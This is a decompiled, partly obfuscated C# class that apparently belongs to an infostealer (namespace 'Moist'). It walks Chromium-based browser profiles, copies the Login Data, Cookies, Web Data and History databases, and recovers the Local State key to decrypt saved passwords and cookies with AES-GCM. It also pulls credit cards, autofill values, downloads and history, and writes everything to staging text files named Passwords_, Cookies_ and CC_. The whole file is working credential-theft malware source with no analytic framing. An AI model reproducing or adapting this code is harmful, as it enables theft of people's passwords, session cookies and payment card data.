using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using Moist;

// Token: 0x02000009 RID: 9
internal class Class4
{
	// Token: 0x0600001B RID: 27 RVA: 0x00005BBC File Offset: 0x00003DBC
	public static void PlqfdbrYf(string string_3)
	{
		try
		{
			List<string> list = new List<string>();
			List<string> list2 = new List<string>
			{
				Help.AppDate,
				Help.LocalData
			};
			List<string> list3 = new List<string>();
			foreach (string path in list2)
			{
				try
				{
					list3.AddRange(Directory.GetDirectories(path));
				}
				catch
				{
				}
			}
			foreach (string text in list3)
			{
				string[] array = null;
				string text2 = "";
				try
				{
					list.AddRange(Directory.GetFiles(text, "Login Data", SearchOption.AllDirectories));
					array = Directory.GetFiles(text, "Login Data", SearchOption.AllDirectories);
					goto IL_39E;
				}
				catch
				{
					goto IL_39E;
				}
				IL_BC:
				foreach (string text3 in array)
				{
					try
					{
						if (File.Exists(text3))
						{
							string text4 = "Unknown";
							foreach (string text5 in Class4.string_2)
							{
								if (text.Contains(text5))
								{
									text4 = text5;
								}
							}
							string sourceFileName = text3;
							string sourceFileName2 = text3 + "\\..\\..\\Local State";
							if (File.Exists(Class4.string_0))
							{
								File.Delete(Class4.string_0);
							}
							if (File.Exists(Class4.string_1))
							{
								File.Delete(Class4.string_1);
							}
							File.Copy(sourceFileName, Class4.string_0);
							File.Copy(sourceFileName2, Class4.string_1);
							Class9 @class = new Class9(Class4.string_0);
							new List<Class5>();
							@class.method_4("logins");
							string text6 = File.ReadAllText(Class4.string_1);
							string[] array4 = Regex.Split(text6, "\"");
							int num = 0;
							string[] array5 = array4;
							int k = 0;
							while (k < array5.Length)
							{
								string a = array5[k];
								if (!(a == "encrypted_key"))
								{
									num++;
									k++;
								}
								else
								{
									text6 = array4[num + 2];
									IL_1E4:
									byte[] bytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text6)).Remove(0, 5));
									byte[] key = Class6.smethod_0(bytes, null);
									int num2 = @class.method_1();
									for (int l = 0; l < num2; l++)
									{
										try
										{
											string text7 = @class.method_0(l, 5);
											byte[] bytes2 = Encoding.Default.GetBytes(text7);
											string str = "";
											try
											{
												if (text7.StartsWith("v10") || text7.StartsWith("v11"))
												{
													byte[] iv = bytes2.Skip(3).Take(12).ToArray<byte>();
													byte[] encryptedBytes = bytes2.Skip(15).ToArray<byte>();
													str = AesGcm256.Decrypt(encryptedBytes, key, iv);
												}
												else
												{
													str = Encoding.Default.GetString(Class6.smethod_0(bytes2, null));
												}
											}
											catch
											{
											}
											text2 = text2 + "Url: " + @class.method_0(l, 1) + "\r\n";
											text2 = text2 + "Login: " + @class.method_0(l, 3) + "\r\n";
											text2 = text2 + "Passwords: " + str + "\r\n";
											text2 = text2 + "Browser: " + text4 + "\r\n\r\n";
											Class4.int_0++;
										}
										catch
										{
										}
									}
									File.Delete(Class4.string_0);
									File.Delete(Class4.string_1);
									if (text4 == "Unknown")
									{
										File.AppendAllText(string_3 + "\\Passwords_" + text4 + ".txt", text2);
										goto IL_38E;
									}
									File.WriteAllText(string_3 + "\\Passwords_" + text4 + ".txt", text2);
									goto IL_38E;
								}
							}
							goto IL_1E4;
						}
						IL_38E:;
					}
					catch
					{
					}
				}
				continue;
				IL_39E:
				if (array != null)
				{
					goto IL_BC;
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x0600001C RID: 28 RVA: 0x00006050 File Offset: 0x00004250
	public static void smethod_0(string string_3)
	{
		try
		{
			List<string> list = new List<string>();
			List<string> list2 = new List<string>
			{
				Help.AppDate,
				Help.LocalData
			};
			List<string> list3 = new List<string>();
			foreach (string path in list2)
			{
				try
				{
					list3.AddRange(Directory.GetDirectories(path));
				}
				catch
				{
				}
			}
			foreach (string text in list3)
			{
				string text2 = "";
				string[] array = null;
				try
				{
					list.AddRange(Directory.GetFiles(text, "Cookies", SearchOption.AllDirectories));
					array = Directory.GetFiles(text, "Cookies", SearchOption.AllDirectories);
					goto IL_3A2;
				}
				catch
				{
					goto IL_3A2;
				}
				IL_BC:
				foreach (string text3 in array)
				{
					try
					{
						if (File.Exists(text3))
						{
							string text4 = "Unknown";
							foreach (string text5 in Class4.string_2)
							{
								if (text.Contains(text5))
								{
									text4 = text5;
								}
							}
							string sourceFileName = text3;
							string sourceFileName2 = text3 + "\\..\\..\\Local State";
							if (File.Exists(Class4.string_0))
							{
								File.Delete(Class4.string_0);
							}
							if (File.Exists(Class4.string_1))
							{
								File.Delete(Class4.string_1);
							}
							File.Copy(sourceFileName, Class4.string_0);
							File.Copy(sourceFileName2, Class4.string_1);
							Class9 @class = new Class9(Class4.string_0);
							new List<Class5>();
							@class.method_4("cookies");
							string text6 = File.ReadAllText(Class4.string_1);
							string[] array4 = Regex.Split(text6, "\"");
							int num = 0;
							string[] array5 = array4;
							int k = 0;
							while (k < array5.Length)
							{
								string a = array5[k];
								if (!(a == "encrypted_key"))
								{
									num++;
									k++;
								}
								else
								{
									text6 = array4[num + 2];
									IL_1E4:
									byte[] bytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text6)).Remove(0, 5));
									byte[] key = Class6.smethod_0(bytes, null);
									int num2 = @class.method_1();
									for (int l = 0; l < num2; l++)
									{
										try
										{
											string text7 = @class.method_0(l, 12);
											byte[] bytes2 = Encoding.Default.GetBytes(text7);
											try
											{
												string text8;
												if (text7.StartsWith("v10"))
												{
													byte[] iv = bytes2.Skip(3).Take(12).ToArray<byte>();
													byte[] encryptedBytes = bytes2.Skip(15).ToArray<byte>();
													text8 = AesGcm256.Decrypt(encryptedBytes, key, iv);
												}
												else
												{
													text8 = Encoding.Default.GetString(Class6.smethod_0(bytes2, null));
												}
												string text9 = @class.method_0(l, 1);
												string text10 = @class.method_0(l, 2);
												string text11 = @class.method_0(l, 4);
												string text12 = @class.method_0(l, 5);
												string text13 = @class.method_0(l, 6);
												text2 += string.Format("{0}\tFALSE\t{1}\t{2}\t{3}\t{4}\t{5}\r\n", new object[]
												{
													text9,
													text11,
													text13.ToUpper(),
													text12,
													text10,
													text8
												});
												Class4.int_3++;
											}
											catch
											{
											}
										}
										catch
										{
										}
									}
									File.Delete(Class4.string_0);
									File.Delete(Class4.string_1);
									if (text4 == "Unknown")
									{
										File.AppendAllText(string_3 + "\\Cookies_" + text4 + ".txt", text2);
										goto IL_392;
									}
									File.WriteAllText(string_3 + "\\Cookies_" + text4 + ".txt", text2);
									goto IL_392;
								}
							}
							goto IL_1E4;
						}
						IL_392:;
					}
					catch
					{
					}
				}
				continue;
				IL_3A2:
				if (array != null)
				{
					goto IL_BC;
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x0600001D RID: 29 RVA: 0x000064E8 File Offset: 0x000046E8
	public static void smethod_1(string string_3)
	{
		try
		{
			List<string> list = new List<string>();
			List<string> list2 = new List<string>
			{
				Help.AppDate,
				Help.LocalData
			};
			List<string> list3 = new List<string>();
			foreach (string path in list2)
			{
				try
				{
					list3.AddRange(Directory.GetDirectories(path));
				}
				catch
				{
				}
			}
			foreach (string text in list3)
			{
				string text2 = "";
				string[] array = null;
				try
				{
					list.AddRange(Directory.GetFiles(text, "Web Data", SearchOption.AllDirectories));
					array = Directory.GetFiles(text, "Web Data", SearchOption.AllDirectories);
					goto IL_27D;
				}
				catch
				{
					goto IL_27D;
				}
				IL_BC:
				foreach (string text3 in array)
				{
					try
					{
						if (File.Exists(text3))
						{
							string text4 = "Unknown";
							foreach (string text5 in Class4.string_2)
							{
								if (text.Contains(text5))
								{
									text4 = text5;
								}
							}
							string sourceFileName = text3;
							if (File.Exists(Class4.string_0))
							{
								File.Delete(Class4.string_0);
							}
							File.Copy(sourceFileName, Class4.string_0);
							Class9 @class = new Class9(Class4.string_0);
							new List<Class5>();
							@class.method_4("credit_cards");
							int num = @class.method_1();
							for (int k = 0; k < num; k++)
							{
								try
								{
									string @string = Encoding.UTF8.GetString(Class6.smethod_0(Encoding.Default.GetBytes(@class.method_0(k, 4)), null));
									string text6 = @class.method_0(k, 1);
									string text7 = @class.method_0(k, 2);
									string text8 = @class.method_0(k, 3);
									string text9 = @class.method_0(k, 9);
									text2 += string.Format("{0}\t{1}/{2}\t{3}\t{4}\r\n******************************\r\n", new object[]
									{
										text6,
										text7,
										text8,
										@string,
										text9
									});
									Class4.int_5++;
								}
								catch
								{
								}
							}
							File.Delete(Class4.string_0);
							File.Delete(Class4.string_1);
							if (text4 == "Unknown")
							{
								File.AppendAllText(string_3 + "\\CC_" + text4 + ".txt", text2);
							}
							else
							{
								File.WriteAllText(string_3 + "\\CC_" + text4 + ".txt", text2);
							}
						}
					}
					catch
					{
					}
				}
				continue;
				IL_27D:
				if (array != null)
				{
					goto IL_BC;
				}
			}
		}
		catch
		{
			Console.WriteLine("Исключение сбор карт");
		}
	}

	// Token: 0x0600001E RID: 30 RVA: 0x0000684C File Offset: 0x00004A4C
	public static void smethod_2(string string_3)
	{
		try
		{
			List<string> list = new List<string>();
			List<string> list2 = new List<string>
			{
				Help.AppDate,
				Help.LocalData
			};
			List<string> list3 = new List<string>();
			foreach (string path in list2)
			{
				try
				{
					list3.AddRange(Directory.GetDirectories(path));
				}
				catch
				{
				}
			}
			foreach (string text in list3)
			{
				string text2 = "";
				string[] array = null;
				try
				{
					list.AddRange(Directory.GetFiles(text, "Web Data", SearchOption.AllDirectories));
					array = Directory.GetFiles(text, "Web Data", SearchOption.AllDirectories);
					goto IL_224;
				}
				catch
				{
					goto IL_224;
				}
				IL_BC:
				foreach (string text3 in array)
				{
					try
					{
						Console.WriteLine(text3);
						if (File.Exists(text3))
						{
							string text4 = "Unknown";
							foreach (string text5 in Class4.string_2)
							{
								if (text.Contains(text5))
								{
									text4 = text5;
								}
							}
							string sourceFileName = text3;
							if (File.Exists(Class4.string_0))
							{
								File.Delete(Class4.string_0);
							}
							File.Copy(sourceFileName, Class4.string_0);
							Class9 @class = new Class9(Class4.string_0);
							new List<Class5>();
							@class.method_4("autofill");
							int num = @class.method_1();
							for (int k = 0; k < num; k++)
							{
								try
								{
									string arg = @class.method_0(k, 0);
									string arg2 = @class.method_0(k, 1);
									text2 += string.Format("Name: {0}\r\nValue: {1}\r\n----------------------------\r\n", arg, arg2);
									Class4.int_1++;
								}
								catch
								{
								}
							}
							File.Delete(Class4.string_0);
							File.Delete(Class4.string_1);
							if (text4 == "Unknown")
							{
								File.AppendAllText(string_3 + "\\Autofills_" + text4 + ".txt", text2);
							}
							else
							{
								File.WriteAllText(string_3 + "\\Autofills_" + text4 + ".txt", text2);
							}
						}
					}
					catch
					{
					}
				}
				continue;
				IL_224:
				if (array != null)
				{
					goto IL_BC;
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x0600001F RID: 31 RVA: 0x00006B50 File Offset: 0x00004D50
	public static void smethod_3(string string_3)
	{
		try
		{
			List<string> list = new List<string>();
			List<string> list2 = new List<string>
			{
				Help.AppDate,
				Help.LocalData
			};
			List<string> list3 = new List<string>();
			foreach (string path in list2)
			{
				try
				{
					list3.AddRange(Directory.GetDirectories(path));
				}
				catch
				{
				}
			}
			foreach (string text in list3)
			{
				string[] array = null;
				try
				{
					list.AddRange(Directory.GetFiles(text, "History", SearchOption.AllDirectories));
					array = Directory.GetFiles(text, "History", SearchOption.AllDirectories);
					goto IL_1F7;
				}
				catch
				{
					goto IL_1F7;
				}
				IL_B5:
				foreach (string text2 in array)
				{
					string text3 = "";
					try
					{
						if (File.Exists(text2))
						{
							string str = "Unknown (" + text + ")";
							foreach (string text4 in Class4.string_2)
							{
								if (text.Contains(text4))
								{
									str = text4;
								}
							}
							string sourceFileName = text2;
							if (File.Exists(Class4.string_0))
							{
								File.Delete(Class4.string_0);
							}
							File.Copy(sourceFileName, Class4.string_0);
							Class9 @class = new Class9(Class4.string_0);
							new List<Class5>();
							@class.method_4("downloads");
							int num = @class.method_1();
							for (int k = 0; k < num; k++)
							{
								try
								{
									string arg = @class.method_0(k, 3);
									string arg2 = @class.method_0(k, 15);
									text3 += string.Format("URL: {0}\r\nPath: {1}\r\n----------------------------\r\n", arg2, arg);
									Class4.int_2++;
								}
								catch
								{
								}
							}
							File.Delete(Class4.string_0);
							File.WriteAllText(string_3 + "\\" + str + "_Downloads.txt", text3);
						}
					}
					catch
					{
					}
				}
				continue;
				IL_1F7:
				if (array != null)
				{
					goto IL_B5;
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000020 RID: 32 RVA: 0x00006E24 File Offset: 0x00005024
	public static void smethod_4(string string_3)
	{
		try
		{
			List<string> list = new List<string>();
			List<string> list2 = new List<string>
			{
				Help.AppDate,
				Help.LocalData
			};
			List<string> list3 = new List<string>();
			foreach (string path in list2)
			{
				try
				{
					list3.AddRange(Directory.GetDirectories(path));
				}
				catch
				{
				}
			}
			foreach (string text in list3)
			{
				string text2 = "";
				string[] array = null;
				try
				{
					list.AddRange(Directory.GetFiles(text, "History", SearchOption.AllDirectories));
					array = Directory.GetFiles(text, "History", SearchOption.AllDirectories);
					goto IL_21D;
				}
				catch
				{
					goto IL_21D;
				}
				IL_BC:
				foreach (string text3 in array)
				{
					try
					{
						if (File.Exists(text3))
						{
							string text4 = "Unknown";
							foreach (string text5 in Class4.string_2)
							{
								if (text.Contains(text5))
								{
									text4 = text5;
								}
							}
							string sourceFileName = text3;
							if (File.Exists(Class4.string_0))
							{
								File.Delete(Class4.string_0);
							}
							File.Copy(sourceFileName, Class4.string_0);
							Class9 @class = new Class9(Class4.string_0);
							new List<Class5>();
							@class.method_4("urls");
							int num = @class.method_1();
							for (int k = 0; k < num; k++)
							{
								try
								{
									string arg = @class.method_0(k, 1);
									string arg2 = @class.method_0(k, 2);
									text2 += string.Format("\r\nTitle: {0}\r\nUrl: {1}", arg2, arg);
									Class4.int_4++;
								}
								catch
								{
								}
							}
							File.Delete(Class4.string_0);
							if (text4 == "Unknown")
							{
								File.AppendAllText(string_3 + "\\History_" + text4 + ".txt", text2, Encoding.Default);
							}
							else
							{
								File.WriteAllText(string_3 + "\\History_" + text4 + ".txt", text2, Encoding.Default);
							}
						}
					}
					catch
					{
					}
				}
				continue;
				IL_21D:
				if (array != null)
				{
					goto IL_BC;
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000021 RID: 33 RVA: 0x0000446C File Offset: 0x0000266C
	public Class4()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x06000022 RID: 34 RVA: 0x00007120 File Offset: 0x00005320
	// Note: this type is marked as 'beforefieldinit'.
	static Class4()
	{
		Class40.gcO0h7LzslQIW();
		Class4.int_0 = 0;
		Class4.int_1 = 0;
		Class4.int_2 = 0;
		Class4.int_3 = 0;
		Class4.int_4 = 0;
		Class4.int_5 = 0;
		Class4.string_0 = Path.GetTempPath() + "\\bd" + Help.HWID + ".tmp";
		Class4.string_1 = Path.GetTempPath() + "\\ls" + Help.HWID + ".tmp";
		Class4.string_2 = new string[]
		{
			"Chrome",
			"Edge",
			"Yandex",
			"Orbitum",
			"Opera",
			"Amigo",
			"Torch",
			"Comodo",
			"CentBrowser",
			"Go!",
			"uCozMedia",
			"Rockmelt",
			"Sleipnir",
			"SRWare Iron",
			"Vivaldi",
			"Sputnik",
			"Maxthon",
			"AcWebBrowser",
			"Epic Browser",
			"MapleStudio",
			"BlackHawk",
			"Flock",
			"CoolNovo",
			"Baidu Spark",
			"Titan Browser",
			"Google",
			"browser"
		};
	}

	// Token: 0x0400001F RID: 31
	public static int int_0;

	// Token: 0x04000020 RID: 32
	public static int int_1;

	// Token: 0x04000021 RID: 33
	public static int int_2;

	// Token: 0x04000022 RID: 34
	public static int int_3;

	// Token: 0x04000023 RID: 35
	public static int int_4;

	// Token: 0x04000024 RID: 36
	public static int int_5;

	// Token: 0x04000025 RID: 37
	private static readonly string string_0;

	// Token: 0x04000026 RID: 38
	private static readonly string string_1;

	// Token: 0x04000027 RID: 39
	private static readonly string[] string_2;
}
